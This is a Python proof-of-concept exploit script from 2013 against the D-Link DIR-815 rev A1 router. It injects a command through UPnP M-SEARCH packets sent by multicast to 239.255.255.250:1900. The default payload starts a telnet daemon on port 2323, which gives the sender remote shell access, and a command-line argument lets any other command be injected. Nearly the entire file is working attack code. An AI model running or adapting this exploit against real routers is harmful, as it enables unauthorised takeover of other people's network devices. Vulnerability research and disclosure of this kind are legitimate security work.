#!/usr/bin/env python

# *******************************************************************************
# *******************************************************************************
# *****************       These files are licensed GPLv2.        ****************
# *******************   See included LICENSE for more info.   *******************
# *******************************************************************************
# *******************************************************************************
# ************************  From your leet hacking cr3w  ************************
# *******************************************************************************
# **********************************    at     **********************************
# ************                http://www.tacnetsol.com                ***********
# *******************************************************************************
# Copyright (c) 2013 Zachary Cutlip
#                    Tactical Network Solutions, LLC



#Proof of concept exploit against the dir-815 rev a1 wifi router
#exploits a command injection vulnerability in the way the dir-815 processes
#UPnP MSEARCH packets.


import sys
import os
import msearch_crash
import struct
import socket

INJECTED_COMMAND="`telnetd -p 2323`"

if len(sys.argv) > 1:
    INJECTED_COMMAND=sys.argv[1]

def send_multicast(mcast_addr,mcast_port,data):
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
    sock.sendto(data,(mcast_addr,mcast_port))
    sock.close()


msearch_string=msearch_crash.MsearchCrash(INJECTED_COMMAND)

print("Injecting command %s in MSEARCH packet.\n\n" % INJECTED_COMMAND)

print str(msearch_string)


send_multicast("239.255.255.250",1900,str(msearch_string))

